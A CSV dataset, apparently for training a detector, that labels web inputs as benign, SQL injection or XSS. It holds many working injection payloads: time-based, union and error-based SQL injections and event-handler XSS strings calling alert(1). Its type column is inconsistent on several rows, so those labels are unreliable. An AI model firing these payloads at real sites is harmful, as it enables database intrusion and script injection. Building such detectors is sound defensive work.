Text,Label,type
52930776w,0,xss
<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>,2,xss
"1'||  (  select 'qued' where 9801  =  9801 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>,2,xss
SELECT * FROM  ( SELECT development FROM traffic ) ,0,xss
SELECT TAN ( -3 ) ;,0,sql
"select * from generate_series  (  5206,5206,case when   (  5206  =  2214  )   then 1 else 0 end  )   limit 1--",1,sql
SELECT * FROM  ( SELECT start FROM cowboy ) ,0,sql
SELECT AVG ( generally ) FROM signal SELECT SUM ( clay ) ,0,xss
"<li><a href=""/wiki/Daniel_Dennett"" title=""Daniel Dennett"">Daniel Dennett </a> </li> </ul>",0,xss
SELECT AVG ( accurate ) FROM keep SELECT SUM ( knife ) ,0,sql
SELECT DAYOFMONTH ( CURDATE (   )  )  ;,0,xss
"<li id=""cite_note-autogenerated1-397""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-autogenerated1_397-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-autogenerated1_397-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
escritor lopez de cardenas 76 12e,0,sql
"1,  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",1,sql
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,2,xss
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE t.term_id  =  2710",0,sql
"<li id=""cite_note-WERBOS1974-241""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-WERBOS1974_241-0"">^ </a> </b> ",0,xss
"<keygen oncontextmenu=""alert(1)"">test</keygen>",2,xss
"<dt><a class=""reference internal"" href=""topics/feed-exports.html""><span class=""doc"">Feed exports",0,xss
31519125v,0,xss
SELECT feet ( s FROM forty RIGHT JOIN,0,sql
cosbey@ocymafa.py,0,sql
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,1,sql
bugarra,0,sql
baril,0,sql
SELECT AVG ( Price ) FROM effort,0,sql
"<li id=""cite_note-sf-345""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-sf_345-0"">^ </a> </b> ",0,xss
	 </span></a></dt>,0,xss
SELECT eager ( s )  FROM crew FULL OUTER JOIN,0,sql
zuk,0,sql
"-6520%""  )   order by 1#",1,sql
elnore,0,sql
"<li>Waterhouse (<i><a href=""/wiki/The_Baroque_Cycle"" title=""The Baroque Cycle"">The Baroque Cycle </a> </i>, 2003) </li> </ul>",0,xss
-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw,1,sql
"avda. juan carlos i, 195, 6f",0,sql
<rb onpointerover=alert(1)>XSS</rb>,2,xss
gall20o,0,sql
"<sub onkeydown=""alert(1)"" contenteditable>test</sub>",2,xss
"   SELECT Employees.poet, COUNT ( Orders.townID )  AS shallowFROM    ( OrdersINNER JOIN spent ON Orders.passageID  =  Employees.valuableID ) ",0,sql
"1%""  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
"<strong onbeforecopy=""alert(1)"" contenteditable>test</strong>",2,xss
-2452'   )    )     )   union all select 1951--,1,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;916–932 </li> </ul>",0,xss
costello_browallius@autoconstruccion.bt,0,sql
36823414t,0,sql
"<p>Are there limits to how intelligent machines—or human-machine hybrids—can be? A superintelligence, hyperintelligence, or superhuman intelligence is a hypothetical agent that would possess intelligence far surpassing that of the brightest and most gifted human mind. <i>Superintelligence </i> may also refer to the form or degree of intelligence possessed by such an agent.<sup id=""cite_ref-Roberts_147-1"" class=""reference""><a href=""#cite_note-Roberts-147"">&#91;144&#93; </a> </sup>",0,xss
"1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  """,1,sql
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,sql
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1,sql
   ( SELECT ProductID   FROM OrderDetails   WHERE Quantity > 99 ) ;,0,xss
""" or ""a""  =  ""a",1,sql
"SELECT EXTRACT ( MINUTE FROM ""2017-06-15 09:34:21"" ) ;",0,sql
	 </span> </li>,0,xss
1' and   (  3020  =  3020  )  *6703,1,xss
SELECT club ( s )  FROM percent SELECT should FROM piano,0,sql
"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqwv"" like ""sqwv",1,sql
SELECT numeral ( s )  FROM somewhere SELECT work FROM box,0,sql
"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
SELECT * FROM Customers ORDER BY CustomerName ASC;,0,sql
"<li id=""cite_note-65""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-65"">^ </a> </b> ",0,xss
"  SELECT IFNULL ( NULL, 500 ) ;",0,sql
<samp onpointerover=alert(1)>XSS</samp>,2,xss
<noframes id=x tabindex=1 onbeforedeactivate=alert(1)></noframes><input autofocus>,2,xss
FROM  ( SELECT DISTINCT building FROM win ) ,0,sql
1'+  (  select 'hplm' where 4008  =  4008 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
1'+  (  select 'vnue' where 5807  =  5807,1,sql
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,1,xss
abondadamente,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation book"">Ivakhnenko, Alexey (1965). <i>Cybernetic Predicting Devices </i>. Kiev: Naukova Dumka. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Cybernetic+Predicting+Devices&amp;rft.place=Kiev&amp;rft.pub=Naukova+Dumka&amp;rft.date=1965&amp;rft.aulast=Ivakhnenko&amp;rft.aufirst=Alexey&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,sql
wahlberg8@am-si.np,0,sql
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'uqyt'  =  'uqyt",1,sql
levi@coivoco.gr,0,sql
1'   )    )    and   (  5091  =  8681  )  *8681 and    (    (   'xevm'  =  'xevm,1,sql
"-4915' union all select 1928,1928,1928,1928#",1,xss
SELECT * FROM sets ORDER BY enjoy,0,sql
"1"" where 4597  =  4597 rlike sleep  (  5  )  --",1,sql
"1%""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,1,sql
SELECT * FROM  ( SELECT remove FROM community ) ,0,sql
"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",1,xss
-2516  )   where 3349  =  3349 or 4855  =  1806--,1,sql
"<datalist onmousedown=""alert(1)"">test</datalist>",2,xss
12527,0,sql
"<sup oncopy=""alert(1)"" contenteditable>test</sup>",2,xss
"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",1,sql
select case when 9390  =  5752 then 1 else null end--,1,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_non_library_sync_1_process_lock' LIMIT 1,0,sql
34855320q,0,sql
nahid,0,sql
"		<a href=""#cite_note-FOOTNOTEEdelson1991-141"">&#91;138&#93; </a> </sup>",0,xss
	 </span> </li>,0,xss
SELECT * FROM explore 3,0,sql
@variable,1,sql
"  UPDATE receive SET face =  'nodded', City =  'cup' WHERE by =  pony",0,xss
	 </span>,0,xss
"<plaintext onbeforecut=""alert(1)"" contenteditable>test</plaintext>",2,xss
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,1,sql
"<li id=""cite_note-Computational_intelligence-173""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Computational_intelligence_173-0"">^ </a> </b> ",0,xss
"   SELECT separate, vote, likeFROM told WHERE camp  IS NOT NULL",0,sql
"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",1,sql
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,sql
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl",1,sql
"1""  )   as pxdq where 2236  =  2236 and 2006  =  2006",1,sql
antih sacido,0,sql
"<center onbeforepaste=""alert(1)"" contenteditable>test</center>",2,xss
"1""  )   where 5005  =  5005 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,sql
"moreno lopez, 55, 9-e",0,sql
SELECT MIN ( move )  AS such FROM construction,0,sql
SELECT * FROM handsome FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM except,0,xss
"1%""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""%""  =  """,1,sql
pa24dan3cea,0,sql
"  SELECT Orders.mostrID, Employees.plenty, Employees.herself FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.summerID ORDER BY Orders.fairlyID",0,sql
" select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1,sql
SELECT AVG ( official ) FROM body,0,sql
SELECT LN ( 2 ) ;,0,sql
-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ',1,sql
	 </span>,0,xss
1'  )   as nftr where 8825  =  8825 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
SELECT nearest ( s )  FROM cage SELECT eight ( s ) ,0,xss
SELECT * FROM short WHERE feel LIKE '%plain%',0,sql
"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",1,xss
"-3270"" where 2144  =  2144 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
 )    )    or pg_sleep  (  __TIME__  )  --,1,sql
"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,xss
hetera,0,sql
58743816e,0,sql
SELECT AVG ( safety ) FROM able,0,sql
11106027v,0,sql
lucas fiallega,0,xss
1   )    )     )   and 9575  =  1640--,1,sql
cuevas de san marcos,0,xss
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""%""  =  """,1,sql
"<li><a href=""#CITEREFKahnemanSlovicTversky1982"">Kahneman, Slovic &amp; Tversky (1982) </a> have shown that people are terrible at elementary problems that involve uncertain reasoning. (See <a href=""/wiki/List_of_cognitive_biases"" title=""List of cognitive biases"">list of cognitive biases </a> for several examples). </li>",0,xss
3.78104E+15,0,sql
"<ul><li><a href=""#CITEREFvan_der_WaltBernard2006"">van der Walt &amp; Bernard 2006 </a> </li> </ul>",0,xss
"1""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--",1,sql
<tfoot onpointerover=alert(1)>XSS</tfoot>,2,xss
"  SELECT guardID AS ID, statement AS ride FROM upward",0,sql
"1   )    )    as nnpe where 9720  =  9720 union all select null,null,null,null,null,null,null,null,null#",1,sql
albero bajo,0,sql
"-1748%""   )    )     )   union all select 2987#",1,sql
terrill,0,sql
1'||  (  select 'xmoq' from dual where 8047  =  8047 and 7533  =  7533  )  ||',1,sql
 </li>,0,xss
"1   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   3102  =  3102",1,sql
 </li>,0,xss
palmario,0,xss
rapetto picabea,0,sql
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'inrm' like 'inrm",1,sql
"<iframe onmouseup=""alert(1)"">test</iframe>",2,xss
1'||  (  select 'yucg' where 2576  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',1,sql
SELECT until FROM nobody,0,sql
1'+  (  select 'wvqj' where 3709  =  3709,1,sql
SELECT AVG ( base ) FROM since SELECT SUM ( smallest ) ,0,xss
SELECT AVG (  column_name  )  FROM table_name WHERE condition ;,0,sql
"	 </span> <span class=""reference-text""><a href=""/w/index.php?title=Steven_Horst&amp;action=edit&amp;redlink=1"" class=""new"" title=""Steven Horst (page does not exist)"">Horst, Steven </a>, (2005) <a rel=""nofollow"" class=""external text"" href=""http://plato.stanford.edu/entries/computational-mind/"">""The Computational Theory of Mind"" </a> in <i>The Stanford Encyclopedia of Philosophy </i> ",0,xss
"<sup onmouseout=""alert(1)"">test</sup>",2,xss
"  SELECT Orders.unlessrID, Employees.shown, Employees.teach FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.slightID ORDER BY Orders.tonightID",0,sql
"<style>:target {color:red;}</style><details id=x style=""transition:color 1s"" ontransitionend=alert(1)></details>",2,xss
"   SELECT COUNT ( about ) , sunlight FROM anywhere BY together",0,sql
1  )   as ilqx where 8547  =  8547,1,sql
	 </span> </li>,0,xss
36384,0,sql
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",1,sql
m7124v3,0,sql
"<li><a href=""/wiki/Resistive_random-access_memory"" title=""Resistive random-access memory"">RRAM </a> </li>",0,xss
"<ul><li><a href=""/wiki/Interaction_design"" title=""Interaction design"">Interaction design </a> </li>",0,xss
	 </span>,0,xss
SELECT farm FROM back UNION SELECT were FROM band ORDER BY ran,0,sql
"	 </span> <span class=""reference-text"">Wallach, pp 55–73. ",0,xss
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,2,xss
"1  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
" SELECT column_name ( s )  FROM least,composed",0,xss
9530,0,sql
SELECT * FROM college WHERE pink = 'piece'  AND  ( each = 'cause' OR divide = 'rather' ) ,0,xss
SELECT * FROM hearing WHERE Price NOT BETWEEN 10 AND 20,0,sql
	 </span>,0,xss
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>",2,xss
SELECT TOP 50 PERCENT * FROM popular,0,sql
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;47–49, who writes ""the conference is generally recognized as the official birthdate of the new science."" </li>",0,xss
"<noframes onmouseover=""alert(1)"">test</noframes>",2,xss
SELECT * FROM rhyme ORDER BY heavy DESC,0,sql
<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>,2,xss
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationstart=""alert(1)""></var>",2,xss
"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,sql
</dl>,0,xss
<svg><ruby onload=alert(1)></ruby>,2,xss
DELETE FROM teach WHERE its = 'all',0,sql
"SELECT DATE_SUB ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;",0,sql
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Computable_knowledge"" title=""Template:Computable knowledge""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Computable_knowledge"" title=""Template talk:Computable knowledge""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Computable_knowledge&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'yqrt' like 'yqrt",1,xss
SELECT * FROM action WHERE breath = 'chicken',0,sql
"  SELECT wide,step,adjective FROM proud LEFT JOIN Orders ON maybe.kitchenID =  belt.customs ORDER BY vertical.snake",0,sql
SELECT * FROM Customers   WHERE Country IN  ( SELECT Country FROM Suppliers ) ;,0,xss
"<li id=""cite_note-Search-185""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Search_185-0"">^ </a> </b> ",0,xss
 UPDATE sink SET fastened = 'shaking'WHERE conversation = 'storm',0,sql
serville9,0,sql
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'mseo' like 'mseo",1,sql
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,sql
"<summary onbeforecut=""alert(1)"" contenteditable>test</summary>",2,xss
9.97465E+15,0,sql
" select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1,xss
"	 </span> <span class=""toctext"">Computationalism and functionalism ",0,xss
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",1,sql
"<li><cite id=""CITEREFHolland1975"" class=""citation book"">Holland, John H. (1975). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/adaptationinnatu00holl""><i>Adaptation in Natural and Artificial Systems </i> </a> ",0,xss
<meter onpointerover=alert(1)>XSS</meter>,2,xss
3.88988E+15,0,sql
" select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1,xss
FROM  ( SELECT DISTINCT include FROM high ) ,0,sql
"<h3><span class=""mw-headline"" id=""AI_textbooks"">AI textbooks ",0,xss
SELECT DAYNAME ( CURDATE (   )  )  ;,0,sql
"1%""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,1,sql
SELECT drop,0,xss
daya basulto,0,sql
	 </span> 2018 ,0,xss
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></element>",2,xss
18243165w,0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT * FROM Customers  WHERE City LIKE '%es%';,0,sql
"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",1,xss
"<dfn onmousemove=""alert(1)"">test</dfn>",2,xss
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",1,sql
SELECT * FROM meet,0,sql
"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""cdnc"" like ""cdnc",1,sql
<svg><animate onend=alert(1) attributeName=x dur=1s>,2,xss
SELECT * FROM strength FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"  SELECT roundID AS ID, our AS soon FROM writing",0,sql
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,2,xss
1   )    )    as bvij where 7913  =  7913,1,sql
"<li><i><a href=""/wiki/Ramon_Llull#Ars_Magna"" title=""Ramon Llull"">Ars Magna </a> </i><span class=""nowrap"">&#160; ",0,xss
SELECT COUNT ( secret ) FROM beside,0,sql
"<canvas ondblclick=""alert(1)"">test</canvas>",2,xss
"<slot onmouseover=""alert(1)"">test</slot>",2,xss
	 </span> </h3>,0,xss
ibarrangelu,0,sql
SELECT AVG ( strong ) FROM loose SELECT SUM ( shade ) ,0,sql
SELECT * FROM part WHERE lying = 'walk'  OR horse = 'electric',0,sql
SELECT MIN ( square )  AS freedom FROM memory,0,sql
 UPDATE silly SET press = 'coach'WHERE manufacturing = 'fourth',0,xss
SELECT MIN ( rock )  AS average FROM dog,0,sql
<progress id=x tabindex=1 onbeforeactivate=alert(1)></progress>,2,xss
SELECT AVG ( accident ) FROM center SELECT SUM ( can ) ,0,sql
SELECT TOP 3 * FROM temperature SELECT * FROM nearest 3SELECT * FROM vessels,0,sql
"Second <a href=""/wiki/AI_winter"" title=""AI winter"">AI winter </a>:",0,xss
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1,xss
revill5,0,sql
"   SELECT should, composed+ ', ' + military+ ' ' + cat+ ', ' + teach AS facing  FROM stopped",0,xss
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationend=""alert(1)""></spacer>",2,xss
43896,0,sql
"cami terminal s/n,",0,sql
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND  ( wp_posts.ID  =  '181' )  AND wp_posts.post_type  =  'page' ORDER BY wp_posts.post_date DESC,0,sql
"<li><a href=""/wiki/Machine_translation"" title=""Machine translation"">Machine translation </a> </li>",0,xss
"1""  )   where 7228  =  7228",1,sql
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,sql
<img src=validimage.png onloadend=alert(1)>,2,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28797 )  ORDER BY meta_id ASC",0,sql
"<li><a href=""/wiki/Cognitive_psychology"" title=""Cognitive psychology"">Cognitive psychology </a> </li>",0,xss
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'uwbt' like 'uwbt,1,sql
"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",1,sql
<legend id=x tabindex=1 onactivate=alert(1)></legend>,2,xss
 ,0,xss
"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",1,sql
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,xss
"<ul oncut=""alert(1)"" contenteditable>test</ul>",2,xss
"<ins draggable=""true"" ondrag=""alert(1)"">test</ins>",2,xss
"<style>@keyframes slidein {}</style><element style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></element>",2,xss
SELECT * FROM egg WHERE thousand = 'mirror'  AND City = 'mainly',0,sql
"1""  )   as hfgk where 1100  =  1100 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/><span style=""position:relative; top: -2px;""><a href=""/wiki/Paywall"" title=""closed access publication – behind paywall""><img alt=""closed access"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Closed_Access_logo_transparent.svg/9px-Closed_Access_logo_transparent.svg.png"" decoding=""async"" width=""9"" height=""14"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Closed_Access_logo_transparent.svg/14px-Closed_Access_logo_transparent.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Closed_Access_logo_transparent.svg/18px-Closed_Access_logo_transparent.svg.png 2x"" data-file-width=""640"" data-file-height=""1000"" /> </a> ",0,xss
SELECT TOP 50 PERCENT * FROM coming SELECT * FROM location FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM found,0,sql
SELECT * FROM tongue WHERE    NOT had = 'way',0,xss
1'   )    )    as iipj where 6560  =  6560,1,sql
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",1,sql
"<style>:target {transform: rotate(180deg);}</style><sup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></sup>",2,xss
tabar,0,xss
"-9725  )   where 9068  =  9068 or elt  (  4723  =  1426,1426  )  --",1,sql
SELECT column_name ( s ) FROM table1RIGHT JOIN,0,sql
"<dt><a class=""reference internal"" href=""topics/developer-tools.html""><span class=""doc"">Using your browser’s Developer Tools for scraping",0,xss
"<fieldset draggable=""true"" ondragstart=""alert(1)"">test</fieldset>",2,xss
" SELECT column_name ( s )  FROM happened,getting",0,sql
